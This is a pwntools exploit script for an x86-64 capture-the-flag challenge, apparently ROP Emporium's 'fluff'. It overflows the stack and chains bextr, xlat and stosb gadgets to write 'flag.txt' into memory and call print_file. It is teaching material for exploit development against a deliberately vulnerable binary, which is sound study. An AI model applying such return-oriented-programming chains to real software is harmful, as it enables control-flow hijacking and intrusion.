from pwn import *

BINARY = "./fluff"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "amd64"
context.binary = BINARY

p = process(BINARY)

"""
; Bits 7:0 of second source operand specifies START bit position
; --> first byte
; Bits 15:8 of second source operand specifies LENGTH
; --> second bytes
; bextr <DESTINATION>, <SOURCE>, <LENGTH:START>

0x40062A    pop     rdx
0x40062B    pop     rcx
0x40062C    add     rcx, 3EF2h
0x400633    bextr   rbx, rcx, rdx
0x400638    retn
----------------------------------

; MOV AL, [RBX + AL]
; adress of a letter of "flag.txt" must be in [RBX + AL]
; --> on first iteration AL = 0xb (puts return, saw with debug)
; --> RBX controlable with the bextr gadget

0x400628    xlat
0x400629    retn
----------------------------------

; store AL at [RDI]
; increments RDI (pretty cool for us :D)
; --> RDI controlable with the pop_rdi gadget
; --> AL  controlable with the xlat gadget

0x400639    stosb
0x40063A    retn
"""

data_adr     = 0x601028
pop_rdi      = p64(0x4006a3) # pop rdi ; ret
xlat_gadget  = p64(0x400628)
bextr_gadget = p64(0x40062A)
stosb_gadget = p64(0x400639)

flag_str = "flag.txt"
flag =  {
            'f': 0x4006A6,
            'l': 0x4003C1,
            'a': 0x400418,
            'g': 0x4003CF,
            '.': 0x4006A7,
            't': 0x4006CB,
            'x': 0x4006C8
            # 't' is already there
        }

rop = b"A" * 40

for i in range(len(flag_str)):
    # al is the stored character at the end of a loop 
    al = ord(flag_str[i - 1])

    # In the first loop, al = 0xb (saw thx to debug)
    if i == 0:
        al = 0xb

    # Gadget to control RBX
    rop += bextr_gadget
    # Take the 0x20 (== 32) first bits and start at index 00
    rop += p64(0x2000)
    # Substracting :
    # - 0x3ef2 because it will be added in the gadget
    # - al because it will be added in the next gadget
    rop += p64(flag[flag_str[i]] - 0x3ef2 - al)
    
    # mov AL, [RBX + AL]
    rop += xlat_gadget
    
    # Storing AL to the data section
    rop += pop_rdi
    rop += p64(data_adr + i)
    rop += stosb_gadget

# print_file("flag.txt")
rop += pop_rdi
rop += p64(data_adr)
rop += p64(ELF.symbols['print_file'])

log.success(f"ROP chain : {rop}")
# pause() --> Used to debug with gdb -p <PROCESS_PID>
p.sendline(rop)

flag = p.recvall().split(b'\n')[-3]
log.success(f"FLAG : {flag}")
